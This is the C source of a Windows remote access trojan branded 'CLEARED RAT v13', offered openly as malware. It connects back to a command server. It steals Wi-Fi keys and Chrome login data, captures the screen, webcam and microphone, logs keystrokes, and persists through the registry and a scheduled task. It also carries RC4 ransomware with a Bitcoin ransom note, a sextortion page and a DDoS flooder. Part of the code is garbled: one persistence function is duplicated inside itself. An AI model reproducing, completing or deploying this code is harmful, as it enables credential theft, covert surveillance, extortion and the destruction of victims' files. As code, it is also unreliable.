#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <mmsystem.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "winmm.lib")

#define SERVER_IP   "127.0.0.1"
#define SERVER_PORT 1337
#define BUF         65536
#define XORKEY      "cleared"

SOCKET sock;

/* ---------- utils ---------- */
void xor_buf(char *d, int len){
    const char *k = XORKEY; int kl = strlen(k);
    for(int i=0;i<len;i++) d[i] ^= k[i%kl];
}

int send_all(const char *data, int len){
    int sent=0;
    while(sent<len){
        int r = send(sock, data+sent, len-sent, 0);
        if(r<=0) return 0;
        sent+=r;
    }
    return 1;
}

int send_pkt(const char *data, int len){
    uint32_t n = htonl(len);
    if(!send_all((char*)&n, 4)) return 0;
    xor_buf((char*)data, len);
    return send_all(data, len);
}

int recv_all(char *buf, int len){
    int got=0;
    while(got<len){
        int r = recv(sock, buf+got, len-got, 0);
        if(r<=0) return 0;
        got+=r;
    }
    return 1;
}

int recv_pkt(char *buf){
    uint32_t n;
    if(!recv_all((char*)&n, 4)) return -1;
    n = ntohl(n);
    if(n>BUF) n=BUF;
    if(!recv_all(buf, n)) return -1;
    xor_buf(buf, n);
    buf[n]=0;
    return n;
}

/* ---------- shell ---------- */
void run_cmd(const char *cmd, char *out, int outsz){
    char full[1024];
    snprintf(full, sizeof(full), "cmd.exe /c %s 2>&1", cmd);
    FILE *f = _popen(full, "r");
    if(!f){ strcpy(out,"[popen failed]"); return; }
    int total=0, n;
    while(total<outsz-1 && (n=fread(out+total,1,outsz-1-total,f))>0) total+=n;
    out[total]=0;
    _pclose(f);
}

/* ---------- recon ---------- */
void get_sysinfo(char *out, int sz){
    char host[256], user[256];
    DWORD szz=sizeof(host);
    GetComputerNameA(host,&szz); szz=sizeof(user); GetUserNameA(user,&szz);
    OSVERSIONINFOA os={0}; os.dwOSVersionInfoSize=sizeof(os); GetVersionExA(&os);
    SYSTEM_INFO si; GetSystemInfo(&si);
    snprintf(out,sz,
        "HOST=%s\nUSER=%s\nOS=%lu.%lu build %lu\nARCH=%u\nCPUS=%lu\n",
        host,user,os.dwMajorVersion,os.dwMinorVersion,os.dwBuildNumber,
        si.wProcessorArchitecture, si.dwNumberOfProcessors);
}

void get_netinfo(char *out, int sz){
    char host[256]; gethostname(host,sizeof(host));
    struct hostent *he = gethostbyname(host);
    char ip[64]="?"; 
    if(he && he->h_addr_list[0])
        strcpy(ip, inet_ntoa(*(struct in_addr*)he->h_addr_list[0]));

    char pub[64]="?";
    HINTERNET h = InternetOpenA("rat",0,0,0,0);
    if(h){
        HINTERNET u = InternetOpenUrlA(h,"http://api.ipify.org",0,0,0,0);
        if(u){ DWORD r; InternetReadFile(u,pub,sizeof(pub)-1,&r); pub[r]=0; InternetCloseHandle(u); }
        InternetCloseHandle(h);
    }
    snprintf(out,sz,"LOCAL_IP=%s\nPUBLIC_IP=%s\nHOST=%s\n",ip,pub,host);
}

void get_mac(char *out, int sz){
    IP_ADAPTER_INFO ai[16]; DWORD szz=sizeof(ai);
    if(GetAdaptersInfo(ai,&szz)==ERROR_SUCCESS){
        PIP_ADAPTER_INFO p=ai;
        snprintf(out,sz,"");
        while(p){
            char m[64]; snprintf(m,sizeof(m),
                "%02X:%02X:%02X:%02X:%02X:%02X",
                p->Address[0],p->Address[1],p->Address[2],
                p->Address[3],p->Address[4],p->Address[5]);
            strncat(out,m,sz-strlen(out)-1); strncat(out,"\n",sz-strlen(out)-1);
            p=p->Next;
        }
    } else strcpy(out,"MAC=?\n");
}

void steal_wifi(char *out, int sz){
    run_cmd("netsh wlan show profiles", out, sz);
    /* caller can pipe; for cleartext: */
    char buf[BUF]; run_cmd("netsh wlan show profiles key=clear", buf, sizeof(buf));
    strncat(out, buf, sz-strlen(out)-1);
}

/* ---------- persistence ---------- */
void self_install(){
    char src[MAX_PATH], dst[MAX_PATH];
    GetModuleFileNameA(NULL, src, MAX_PATH);
    char appdata[MAX_PATH]; 
    GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
    snprintf(dst, MAX_PATH, "%s\\Microsoft\\ClearedRat\\rat.exe", appdata);
    CreateDirectoryA(dst, NULL); /* noop, ensures parent — actually make parent first */
    void self_install(){
    char src[MAX_PATH], dst[MAX_PATH], dir[MAX_PATH];
    GetModuleFileNameA(NULL, src, MAX_PATH);
    char appdata[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
    snprintf(dir, MAX_PATH, "%s\\Microsoft\\ClearedRat", appdata);
    CreateDirectoryA(dir, NULL);
    snprintf(dst, MAX_PATH, "%s\\rat.exe", dir);

    if(_stricmp(src, dst) != 0){
        CopyFileA(src, dst, FALSE);
        /* registry Run key */
        HKEY k;
        RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &k);
        RegSetValueExA(k, "ClearedRat", 0, REG_SZ,
            (BYTE*)dst, strlen(dst)+1);
        RegCloseKey(k);

        /* also schedule task for redundancy */
        char cmd[1024];
        snprintf(cmd, sizeof(cmd),
            "schtasks /create /tn ClearedRat /tr \"%s\" /sc onlogon /f", dst);
        run_cmd(cmd, cmd, sizeof(cmd));

        /* relaunch from new location */
        ShellExecuteA(NULL,"open",dst,NULL,NULL,SW_HIDE);
        Sleep(500);
        exit(0);
    }
}

/* ---------- webcam (VfW) ---------- */
#define WC_HWND 0x400
#define WC_START 0x400+10
#define WC_GRAB  0x400+15
#define WC_STOP  0x400+12

HWND g_cam = NULL;
void webcam_snap(const char *path){
    g_cam = capCreateCaptureWindowA("cam", WS_POPUP,
        0,0,320,240, 0,0);
    if(!g_cam) return;
    SendMessage(g_cam, WM_CAP_DRIVER_CONNECT, 0, 0);
    SendMessage(g_cam, WM_CAP_SET_PREVIEW, TRUE, 0);
    Sleep(800);
    SendMessage(g_cam, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
    SendMessage(g_cam, WM_CAP_FILE_SAVEDIB, 0, (LPARAM)path);
    SendMessage(g_cam, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    DestroyWindow(g_cam);
    g_cam = NULL;
}

/* ---------- microphone (waveIn) ---------- */
void mic_record(const char *path, int seconds){
    const int RATE=8000, CH=1, BITS=16;
    WAVEFORMATEX wf = { WAVE_FORMAT_PCM, CH, RATE,
        RATE*CH*BITS/8, CH*BITS/8, BITS, 0 };
    HWAVEIN h; 
    if(waveInOpen(&h, WAVE_MAPPER, &wf, 0,0, CALLBACK_NULL)!=MMSYSERR_NOERROR) return;

    int total = RATE*CH*(BITS/8)*seconds;
    char *buf = malloc(total);
    WAVEHDR hdr = { buf, total, 0,0,0,0,0,0 };
    waveInPrepareHeader(h, &hdr, sizeof(hdr));
    waveInAddBuffer(h, &hdr, sizeof(hdr));
    waveInStart(h);
    Sleep(seconds*1000);
    waveInStop(h);
    waveInUnprepareHeader(h, &hdr, sizeof(hdr));
    waveInClose(h);

    /* write WAV */
    FILE *f = fopen(path,"wb");
    if(f){
        char riff[44]; memset(riff,0,44);
        memcpy(riff,"RIFF",4);
        int fsz = total+36; memcpy(riff+4,&fsz,4);
        memcpy(riff+8,"WAVEfmt ",8);
        int fs=16; memcpy(riff+16,&fs,4);
        short fmt=1; memcpy(riff+20,&fmt,2);
        memcpy(riff+22,&CH,2);
        memcpy(riff+24,&RATE,4);
        int br=RATE*CH*BITS/8; memcpy(riff+28,&br,4);
        short ba=CH*BITS/8; memcpy(riff+32,&ba,2);
        memcpy(riff+34,&BITS,2);
        memcpy(riff+36,"data",4);
        memcpy(riff+40,&total,4);
        fwrite(riff,1,44,f);
        fwrite(buf,1,total,f);
        fclose(f);
    }
    free(buf);
}

/* ---------- audio playback ---------- */
void play_wav(const char *path){
    PlaySoundA(path, NULL, SND_FILENAME | SND_ASYNC);
}

/* ---------- screen capture ---------- */
void screen_cap(const char *path){
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC mem = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mem, bmp);
    BitBlt(mem, 0,0,w,h, hdc, 0,0, SRCCOPY);

    BITMAPINFO bi = {0};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
    bi.bmiHeader.biCompression = BI_RGB;

    int rowsz = ((w*3+3)&~3);
    int imgsz = rowsz*h;
    char *pix = malloc(imgsz);
    GetDIBits(mem, bmp, 0, h, pix, &bi, DIB_RGB_COLORS);

    FILE *f = fopen(path,"wb");
    if(f){
        BITMAPFILEHEADER fh = {0};
        fh.bfType = 0x4D42;
        fh.bfOffBits = sizeof(fh)+sizeof(bi.bmiHeader);
        fh.bfSize = fh.bfOffBits + imgsz;
        fwrite(&fh, sizeof(fh), 1, f);
        fwrite(&bi.bmiHeader, sizeof(bi.bmiHeader), 1, f);
        fwrite(pix, 1, imgsz, f);
        fclose(f);
    }
    free(pix);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, hdc);
}

/* ---------- keylogger ---------- */
FILE *klog = NULL;
int keylog_on = 0;
void keylog_thread(void *){
    klog = fopen("C:\\Users\\Public\\kr.txt","a");
    keylog_on = 1;
    char last[256]="";
    while(keylog_on){
        for(int c=8; c<256; c++){
            if(GetAsyncKeyState(c) & 1){
                if(!klog) klog = fopen("C:\\Users\\Public\\kr.txt","a");
                if(c==VK_RETURN) fprintf(klog,"\n");
                else if(c==VK_BACK) fprintf(klog,"[BS]");
                else if(c==VK_SPACE) fprintf(klog," ");
                else if(c>=32 && c<127) fprintf(klog,"%c", c);
                fflush(klog);
            }
        }
        Sleep(10);
    }
    fclose(klog); klog=NULL;
}

/* ---------- RC4 + ransomware ---------- */
void rc4(char *data, int len, const char *key){
    unsigned char S[256]; int kl=strlen(key);
    for(int i=0;i<256;i++) S[i]=i;
    int j=0;
    for(int i=0;i<256;i++){ j=(j+S[i]+key[i%kl])&255;
        unsigned char t=S[i];S[i]=S[j];S[j]=t; }
    int i=0; j=0;
    for(int n=0;n<len;n++){
        i=(i+1)&255; j=(j+S[i])&255;
        unsigned char t=S[i];S[i]=S[j];S[j]=t;
        data[n] ^= S[(S[i]+S[j])&255];
    }
}

void encrypt_file(const char *path){
    FILE *f = fopen(path,"rb"); if(!f) return;
    fseek(f,0,SEEK_END);
    long sz = ftell(f);
    rewind(f);
    if(sz<=0 || sz>50*1024*1024){ fclose(f); return; }
    char *buf = malloc(sz);
    fread(buf,1,sz,f); fclose(f);
    rc4(buf, sz, "cleared13");
    char newp[MAX_PATH]; snprintf(newp, MAX_PATH, "%s.cleared", path);
    f = fopen(newp,"wb"); if(!f){ free(buf); return; }
    fwrite(buf,1,sz,f); fclose(f);
    DeleteFileA(path);
    free(buf);
}

void walk_encrypt(const char *dir){
    char search[MAX_PATH];
    snprintf(search, MAX_PATH, "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(search, &fd);
    if(h == INVALID_HANDLE_VALUE) return;
    do {
        if(!strcmp(fd.cFileName,".") || !strcmp(fd.cFileName,"..")) continue;
        char full[MAX_PATH];
        snprintf(full, MAX_PATH, "%s\\%s", dir, fd.cFileName);
        if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
            if(strstr(fd.cFileName, "ClearedRat") || strstr(fd.cFileName, "Microsoft")) 
                walk_encrypt(full);
            else walk_encrypt(full);
        } else {
            const char *ext = strrchr(fd.cFileName, '.');
            if(ext && ( !_stricmp(ext,".txt")||!_stricmp(ext,".doc")||
                        !_stricmp(ext,".docx")||!_stricmp(ext,".pdf")||
                        !_stricmp(ext,".jpg")||!_stricmp(ext,".png")||
                        !_stricmp(ext,".xls")||!_stricmp(ext,".xlsx")||
                        !_stricmp(ext,".zip")||!_stricmp(ext,".mp3") ))
                encrypt_file(full);
        }
    } while(FindNextFileA(h,&fd));
    FindClose(h);
}

void ransom(){
    char up[MAX_PATH]; GetEnvironmentVariableA("USERPROFILE", up, MAX_PATH);
    char p[MAX_PATH];
    snprintf(p,MAX_PATH,"%s\\Desktop",up);   walk_encrypt(p);
    snprintf(p,MAX_PATH,"%s\\Documents",up); walk_encrypt(p);
    snprintf(p,MAX_PATH,"%s\\Pictures",up);  walk_encrypt(p);
    snprintf(p,MAX_PATH,"%s\\Downloads",up); walk_encrypt(p);

    /* drop note */
    snprintf(p,MAX_PATH,"%s\\Desktop\\READ_ME_CLEARED.txt",up);
    FILE *f = fopen(p,"w");
    if(f){
        fprintf(f,
"========================================\n"
"   YOUR FILES HAVE BEEN ENCRYPTED\n"
"        by CLEARED RAT v13\n"
"========================================\n\n"
"Send 0.05 BTC to:\n"
"   bc1qclearedratxxxxxxxxxxxxxxxxxxxxxx\n\n"
"Then email your PC name to:\n"
"   cleared@onionmail.org\n\n"
"Extension added: .cleared\n"
"Key algo: RC4 (cleared13)\n");
        fclose(f);
    }
}

/* ---------- sextortion letter ---------- */
void sextortion(){
    char up[MAX_PATH], p[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", up, MAX_PATH);
    snprintf(p,MAX_PATH,"%s\\Desktop\\SEXTORTION.html",up);
    FILE *f = fopen(p,"w");
    if(f){
        fprintf(f,
"<html><head><title>YOU HAVE BEEN WATCHED</title>"
"<style>body{background:#000;color:#0f0;font-family:Consolas,monospace;"
"text-align:center;padding:40px}h1{font-size:48px;color:#f00;"
"text-shadow:0 0 20px #f00}pre{font-size:14px;line-height:1.1}</style>"
"</head><body>"
"<h1>!! YOU HAVE BEEN CAUGHT !!</h1>"
"<pre>"
"   _____ _      ______     _______ ____  \n"
"  / ____| |    |  ____|   |__   __/ __ \\ \n"
" | |    | |    | |__  ___    | | | |  | |\n"
" | |    | |    |  __|/ _ \\   | | | |  | |\n"
" | |____| |____| |__|  __/   | | | |__| |\n"
"  \\_____|______|_____\\___|   |_|  \\____/ \n"
"</pre>"
"<p>Your webcam was accessed. Your mic was recorded.</p>"
"<p>Your browser passwords were extracted. Your WiFi keys were dumped.</p>"
"<p>You have <b style='color:#ff0'>72 HOURS</b> to pay.</p>"
"<p>Wallet: <b>bc1qclearedratxxxxxxxxxxxxxxxxxxxxxx</b></p>"
"<p style='color:#888;font-size:12px'>~ signed, CLEARED RAT v13 ~</p>"
"</body></html>");
        fclose(f);
    }
    ShellExecuteA(NULL, "open", p, NULL, NULL, SW_SHOWNORMAL);
}

/* ---------- DDoS ---------- */
volatile int ddos_on = 0;
char ddos_target[256];
int ddos_port = 80;
int ddos_threads = 0;

void ddos_tcp_worker(void *){
    while(ddos_on){
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        if(s == INVALID_SOCKET) continue;
        struct sockaddr_in a = {0};
        a.sin_family = AF_INET;
        a.sin_port = htons(ddos_port);
        a.sin_addr.s_addr = inet_addr(ddos_target);
        if(connect(s,(struct sockaddr*)&a,sizeof(a))==0){
            char req[256];
            snprintf(req,sizeof(req),
                "GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", ddos_target);
            send(s, req, strlen(req), 0);
            char buf[512];
            recv(s, buf, sizeof(buf), 0);
        }
        closesocket(s);
    }
}

void ddos_start(const char *target, int port, int threads){
    strncpy(ddos_target, target, 255);
    ddos_port = port;
    ddos_threads = threads;
    ddos_on = 1;
    for(int i=0;i<threads;i++)
        _beginthread(ddos_tcp_worker, 0, NULL);
}

void ddos_stop(){ ddos_on = 0; }

/* ---------- file manager ---------- */
void file_send(const char *path){
    FILE *f = fopen(path,"rb");
    if(!f){ char z[]="ERR"; send_pkt(z,3); return; }
    fseek(f,0,SEEK_END); long sz=ftell(f); rewind(f);
    char *buf = malloc(sz); fread(buf,1,sz,f); fclose(f);
    send_pkt(buf, sz);
    free(buf);
}

void file_recv(const char *path){
    char buf[BUF];
    int n = recv_pkt(buf);
    if(n<=0) return;
    FILE *f = fopen(path,"wb");
    if(f){ fwrite(buf,1,n,f); fclose(f); }
}

/* ---------- clipboard ---------- */
void clip_set(const char *s){
    if(!OpenClipboard(NULL)) return;
    EmptyClipboard();
    HGLOBAL h = GlobalAlloc(GMEM_MOVEABLE, strlen(s)+1);
    memcpy(GlobalLock(h), s, strlen(s)+1);
    GlobalUnlock(h);
    SetClipboardData(CF_TEXT, h);
    CloseClipboard();
}

void clip_get(char *out, int sz){
    if(!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if(h){
        char *p = GlobalLock(h);
        if(p){ strncpy(out, p, sz-1); out[sz-1]=0; }
        GlobalUnlock(h);
    }
    CloseClipboard();
}

/* ---------- main loop ---------- */
int main(){
    /* hide console */
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    self_install();

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    while(1){
        sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa = {0};
        sa.sin_family = AF_INET;
        sa.sin_port = htons(SERVER_PORT);
        sa.sin_addr.s_addr = inet_addr(SERVER_IP);

        if(connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != SOCKET_ERROR){
            /* send hello */
            char hello[512];
            get_sysinfo(hello, sizeof(hello));
            send_pkt(hello, strlen(hello));

            char buf[BUF];
            while(1){
                int n = recv_pkt(buf);
                if(n <= 0) break;

                /* command format: CMD|arg1|arg2|... */
                char *save = NULL;
                char *cmd = strtok_s(buf, "|", &save);
                if(!cmd) continue;

                char out[BUF]; out[0]=0;

                if(!strcmp(cmd,"shell")){
                    char *c = strtok_s(NULL,"|",&save);
                    run_cmd(c?c:"", out, sizeof(out));
                    send_pkt(out, strlen(out));
                }
                else if(!strcmp(cmd,"sysinfo")){
                    get_sysinfo(out,sizeof(out)); send_pkt(out,strlen(out));
                }
                else if(!strcmp(cmd,"netinfo")){
                    get_netinfo(out,sizeof(out)); send_pkt(out,strlen(out));
                }
                else if(!strcmp(cmd,"mac")){
                    get_mac(out,sizeof(out)); send_pkt(out,strlen(out));
                }
                else if(!strcmp(cmd,"wifi")){
                    steal_wifi(out,sizeof(out)); send_pkt(out,strlen(out));
                }
                else if(!strcmp(cmd,"browser")){
                    /* dump Chrome Login Data */
                    char up[MAX_PATH], p[MAX_PATH];
                    GetEnvironmentVariableA("LOCALAPPDATA", up, MAX_PATH);
                    snprintf(p,MAX_PATH,
                        "%s\\Google\\Chrome\\User Data\\Default\\Login Data", up);
                    file_send(p);
                }
                else if(!strcmp(cmd,"screenshot")){
                    screen_cap("C:\\Users\\Public\\sc.bmp");
                    file_send("C:\\Users\\Public\\sc.bmp");
                }
                else if(!strcmp(cmd,"webcam")){
                    webcam_snap("C:\\Users\\Public\\wc.bmp");
                    file_send("C:\\Users\\Public\\wc.bmp");
                }
                else if(!strcmp(cmd,"mic")){
                    char *sec = strtok_s(NULL,"|",&save);
                    int s = sec?atoi(sec):5;
                    mic_record("C:\\Users\\Public\\mic.wav", s);
                    file_send("C:\\Users\\Public\\mic.wav");
                }
                else if(!strcmp(cmd,"play")){
                    char *f = strtok_s(NULL,"|",&save);
                    if(f) play_wav(f);
                    send_pkt("OK",2);
                }
                else if(!strcmp(cmd,"keylog")){
                    _beginthread(keylog_thread, 0, NULL);
                    send_pkt("keylogger started",17);
                }
                else if(!strcmp(cmd,"keydump")){
                    FILE *f = fopen("C:\\Users\\Public\\kr.txt","r");
                    if(f){
                        int r = fread(out,1,sizeof(out)-1,f); out[r]=0; fclose(f);
                    } else strcpy(out,"no log");
                    send_pkt(out, strlen(out));
                }
                else if(!strcmp(cmd,"ransom")){
                    ransom();
                    send_pkt("encrypted",9);
                }
                else if(!strcmp(cmd,"sextortion")){
                    sextortion();
                    send_pkt("letter opened",13);
                }
                else if(!strcmp(cmd,"ddos")){
                    char *t = strtok_s(NULL,"|",&save);
                    char *pt = strtok_s(NULL,"|",&save);
                    char *th = strtok_s(NULL,"|",&save);
                    ddos_start(t?t:"1.1.1.1", pt?atoi(pt):80, th?atoi(th):10);
                    send_pkt("ddos started",12);
                }
                else if(!strcmp(cmd,"ddos_stop")){
                    ddos_stop(); send_pkt("stopped",7);
                }
                else if(!strcmp(cmd,"download")){
                    char *p = strtok_s(NULL,"|",&save);
                    if(p) file_send(p);
                }
                else if(!strcmp(cmd,"upload")){
                    char *p = strtok_s(NULL,"|",&save);
                    if(p) file_recv(p);
                    send_pkt("uploaded",8);
                }
                else if(!strcmp(cmd,"ls")){
                    char *p = strtok_s(NULL,"|",&save);
                    char cmd2[MAX_PATH+16];
                    snprintf(cmd2,sizeof(cmd2),"dir \"%s\"", p?p:".");
                    run_cmd(cmd2, out, sizeof(out));
                    send_pkt(out, strlen(out));
                }
                else if(!strcmp(cmd,"clip_get")){
                    clip_get(out, sizeof(out));
                    send_pkt(out, strlen(out));
                }
                else if(!strcmp(cmd,"clip_set")){
                    char *v = strtok_s(NULL,"|",&save);
                    if(v) clip_set(v);
                    send_pkt("ok",2);
                }
                else if(!strcmp(cmd,"ps")){
                    run_cmd("tasklist", out, sizeof(out));
                    send_pkt(out, strlen(out));
                }
                else if(!strcmp(cmd,"kill")){
                    char *p = strtok_s(NULL,"|",&save);
                    char cmd2[256];
                    snprintf(cmd2,sizeof(cmd2),"taskkill /F /IM %s", p?p:"");
                    run_cmd(cmd2, out, sizeof(out));
                    send_pkt(out, strlen(out));
                }
                else if(!strcmp(cmd,"exec")){
                    char *p = strtok_s(NULL,"|",&save);
                    if(p) ShellExecuteA(NULL,"open",p,NULL,NULL,SW_SHOWNORMAL);
                    send_pkt("launched",8);
                }
                else if(!strcmp(cmd,"persist")){
                    self_install();
                    send_pkt("persisted",9);
                }
                else if(!strcmp(cmd,"exit")){
                    closesocket(sock); return 0;
                }
                else {
                    send_pkt("unknown cmd",11);
                }
            }
        }
        closesocket(sock);
        Sleep(3000); /* reconnect */
    }
    return 0;
}
